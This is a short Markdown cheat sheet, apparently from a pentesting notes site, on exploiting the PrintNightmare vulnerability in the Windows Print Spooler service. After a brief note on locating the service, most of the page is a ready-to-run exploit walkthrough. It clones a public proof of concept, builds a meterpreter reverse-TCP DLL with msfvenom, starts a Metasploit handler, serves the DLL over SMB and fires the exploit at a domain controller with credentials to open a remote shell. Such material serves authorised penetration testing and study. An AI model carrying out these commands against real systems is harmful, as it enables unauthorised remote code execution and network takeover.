---
title: Windows Print Spooler Service
desc: A service that is running on each computer that participates in the Print Services system. It may be vulnerable to the PrintNightmare (CVE-2021-1675 / CVE-2021-34527).
tags: [CVE-2021-1675, CVE-2021-34527, Impacket, Metasploit, Print, PrintNightmare, Windows]
alts: []
render_with_liquid: false
---

**[The proof of concept](https://github.com/cube0x0/CVE-2021-1675){:target="_blank"}** is available.

## 1. Where is the Print Spooler on Windows

1. **Open Services**

2. **You are able to find the Print Spooler on the Right Pane**

3. **Double-Click on It**

    You can start/stop/pause/resume the Print Spooler in there.

<br />

## 2. Exploit

1. **Clone the Repository**

    ```sh
    git clone https://github.com/cube0x0/CVE-2021-1675
    ```

2. **Download Impacket and Setup**

    ```sh
    git clone https://github.com/cube0x0/impacket
    cd impacket
    python3 setup.py install
    ```

3. **Create the Malicious DLL with Msfvenom**

    ```sh
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<local-ip> LPORT=<local-port> -f dll -o ./malicious.dll
    ```

4. **Start Metasploit and Reverse TCP**

    ```sh
    msfconsole

    msf > use exploit/multi/handler
    msf > set payload windows/x64/meterpreter/reverse_tcp
    msf > set lhost <local-ip>
    msf > set lport <local-port>

    msf > run -j

    # Started reverse tcp

    msf > jobs
    ```

5. **Host the Malicious DLL**

    ```sh
    cd impacket/examples
    python3 smbserver.py <share-name> <share-path> -smb2support
    ```

6. **Examine the Target Fits the Criteria to Exploit It**

    ```sh
    python3 rpcdump.py @<remote-ip> | egrep 'MS-RPRN|MS-PAR'
    # Protocol: [MS-RPRN]: Print System Remote Protocol 
    # Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
    ```

7. **Run the Exploit**

    ```sh
    cd CVE-2021-1675
    python3 CVE-2021-1675.py Domain.Controller.local/<username>:<password>@<remote-ip> '\\<local-ip>\path\to\malicious.dll'
    ```